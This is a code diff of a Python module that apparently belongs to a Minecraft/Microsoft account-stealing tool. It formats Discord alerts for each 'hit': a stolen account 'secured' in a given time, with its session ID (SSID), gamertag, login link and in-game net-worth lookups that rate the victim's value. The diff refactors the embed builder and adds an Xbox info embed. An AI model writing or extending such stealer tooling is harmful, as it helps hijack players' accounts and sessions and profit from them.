@@ -1,14 +1,12 @@
 from minecraft.get_hypixel import get_hypixel_stats
 from minecraft.get_donut import get_donut_stats
-from minecraft.simplify import simplify
+from shared.simplify import simplify
 
-from database.database import DBConnection
 from urllib.parse import quote
 from discord import Embed
 import time
-import uuid
 
-async def build_account_data(account: dict, elapsed: float = 0) -> dict:
+async def build_account_embeds(account: dict, elapsed: float = 0, claim_id: str = "") -> dict:
     name = quote(account["minecraft"]["name"])
 
     info_embed = Embed()
@@ -29,13 +27,19 @@ async def build_account_data(account: dict, elapsed: float = 0) -> dict:
     stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["skyblock"]["slevel"])}', inline=True)
     stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
 
-    claim_id = uuid.uuid4().hex[:8]
-    with DBConnection() as database:
-        database.add_secured_account(claim_id, account)
+    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
+    xbox_embed.add_field(name="Gamertag", value=f"```{account['minecraft']['gamertag']}```", inline=False)
+    xbox_embed.add_field(name="Microsoft Points", value="```N/A```", inline=True)
 
     hit_embed = Embed(
         title=f"New Hit! Secured in {round(elapsed, 2)}s",
-        description=f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
+        description=(
+            f"[Login](https://login.live.com/) | "
+            f"[Donut](https://www.donutstats.net/player-finder) | "
+            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
+            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
+            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
+        ),
         color=0x279CF5
     )
     hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
@@ -64,6 +68,7 @@ async def build_account_data(account: dict, elapsed: float = 0) -> dict:
             "stats_embed": stats_embed,
             "ssid_embed": ssid_embed,
             "info_embed": info_embed,
+            "xbox_embed": xbox_embed,
             "account_details": (
                 f"**Username:** {account['minecraft']['name']}\n"
                 f"**Has MC:** {True if account['minecraft']['SSID'] else False}\n"
